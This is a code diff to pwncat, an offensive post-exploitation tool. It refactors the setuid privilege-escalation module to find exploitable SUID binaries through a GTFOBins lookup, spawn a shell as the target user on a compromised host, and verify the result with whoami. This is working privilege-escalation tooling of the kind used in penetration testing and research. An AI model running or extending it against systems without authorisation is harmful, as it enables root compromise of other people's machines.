@@ -8,6 +8,7 @@ from colorama import Fore, Style
 
 from pwncat.util import info, success, error, progress, warn
 from pwncat.privesc.base import Method, PrivescError, Technique
+from pwncat import gtfobins
 
 # https://gtfobins.github.io/#+suid
 known_setuid_privescs = {
@@ -121,17 +122,18 @@ class SetuidMethod(Method):
 
         for user, paths in self.suid_paths.items():
             for path in paths:
-                for name, cmd in known_setuid_privescs.items():
-                    if os.path.basename(path) == name:
-                        yield Technique(user, self, (path, name, cmd))
+                binary = gtfobins.Binary.find(path)
+                if binary is not None:
+                    yield Technique(user, self, binary)
 
     def execute(self, technique: Technique):
         """ Run the specified technique """
 
-        path, name, commands = technique.ident
+        binary = technique.ident
+        enter, exit = binary.shell("/bin/bash")
 
         info(
-            f"attempting potential privesc with {Fore.GREEN}{Style.BRIGHT}{path}{Style.RESET_ALL}",
+            f"attempting potential privesc with {Fore.GREEN}{Style.BRIGHT}{binary.path}{Style.RESET_ALL}",
         )
 
         before_shell_level = self.pty.run("echo $SHLVL").strip()
@@ -141,13 +143,14 @@ class SetuidMethod(Method):
         #     self.pty.run(each_command.format(path), wait=False)
 
         # Run the start commands
-        self.pty.run(commands[0].format(path) + "\n")
+        self.pty.run(enter + "\n")
+        self.pty.recvuntil("\n")
 
         # sleep(0.1)
         user = self.pty.run("whoami").strip().decode("utf-8")
         if user == technique.user:
             success("privesc succeeded")
-            return commands[1]
+            return exit
         else:
             error(f"privesc failed (still {user} looking for {technique.user})")
             after_shell_level = self.pty.run("echo $SHLVL").strip()
@@ -156,6 +159,9 @@ class SetuidMethod(Method):
             )
             if after_shell_level > before_shell_level:
                 info("exiting spawned inner shell")
-                self.pty.run(commands[1], wait=False)  # here be dragons
+                self.pty.run(exit, wait=False)  # here be dragons
 
         raise PrivescError(f"escalation failed for {technique}")
+
+    def get_name(self, tech: Technique):
+        return f"{Fore.GREEN}{tech.user}{Fore.RESET} via {Fore.CYAN}{tech.ident.path}{Fore.RESET} ({Fore.RED}setuid{Fore.RESET})"
